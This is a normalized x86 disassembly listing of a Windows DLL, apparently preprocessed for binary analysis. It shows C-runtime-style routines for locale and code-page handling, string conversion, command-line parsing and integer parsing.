test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
pop esi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_100808b4
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_100808e3
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1007f8f0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10080947
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10058423
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10030370
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10030370
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1007f8f0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10080ad7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10080b53
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_1002255a
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10021090
pop ecx
cmp eax ebx
je r-xdata
call sub_10082fa0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_1002255a
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10021090
pop ecx
cmp eax ebx
je r-xdata
call sub_10082fa0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_10080d3a
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_100567c9
pop ecx
pop edi
sub_10080d60
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_1005f1fb
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_10004c7b
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_10004c7b
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001b2d2
pop ecx
push r--data
push ebx
push edi
call sub_1003e904
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_1001b2d2
pop ecx
push [ ebp - 0x10 ]
call sub_1001b2d2
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001b2d2
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_1001b2d2
pop ecx
sub_10080ec5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_1002d269
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_10001c4c
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fa40
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_1005f1fb
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_1007f580
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_10042442
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_1007f580
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_1001b2d2
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10058423
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_1001b2d2
push [ ebx + 0x54 ]
call sub_1001b2d2
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_1004ccb9
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_100811ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10080d60
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_10080ec5
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_10001c4c
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_10080ec5
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_1003a1fc
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_1007fa40
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_1007f530
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1005aa2b
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_10080ec5
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10083560
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1008141b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10081452
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1000f3f8
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1000f3f8
pop ecx
test eax eax
je r-xdata
call sub_1000f3f8
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_100815ec
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_1003ac8f
add esp 0xc
test eax eax
je r-xdata
call sub_100579de
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_1007f580
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_10081643
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_10001b6d
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_10081679
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_10081663
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_100816a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_10051cf5
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_100718ba
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1005b670
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
